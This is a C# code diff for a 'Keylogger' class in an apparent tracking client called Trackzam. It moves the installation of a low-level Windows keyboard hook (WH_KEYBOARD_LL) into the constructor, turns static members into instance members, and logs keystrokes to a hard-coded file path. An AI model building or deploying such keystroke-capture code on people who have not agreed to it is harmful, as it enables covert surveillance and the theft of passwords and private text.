@@ -11,6 +11,13 @@ namespace TrackzamClient
 {
     public class Keylogger
     {  
+
+        public Keylogger()
+        {
+            // set the correct process as our keyboard hook
+            _proc = HookCallback;
+            _hookID = SetHook(_proc);
+        }
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
@@ -55,7 +62,7 @@ namespace TrackzamClient
         {
             string fileName = "\\" + TrackzamTimer.GetNowString();
             _writer = new StreamWriter(_logDir + fileName);
-            _hookID = SetHook(_proc);
+           // _hookID = SetHook(_proc);
         }
 
         public void Stop()
@@ -183,10 +190,10 @@ namespace TrackzamClient
         
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-        public static LowLevelKeyboardProc _proc = HookCallback;
-        public static IntPtr _hookID = IntPtr.Zero;
+        public  LowLevelKeyboardProc _proc;
+        public  IntPtr _hookID = IntPtr.Zero;
 
-        public static IntPtr SetHook(LowLevelKeyboardProc proc)
+        public IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
@@ -198,13 +205,13 @@ namespace TrackzamClient
 
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
-                // TODO let it be the logDir attribiute
+                // TODO let it be the logDir attribute
                 string path = @"C:\Test\MyTest.txt";
 
                 if(!File.Exists(path))
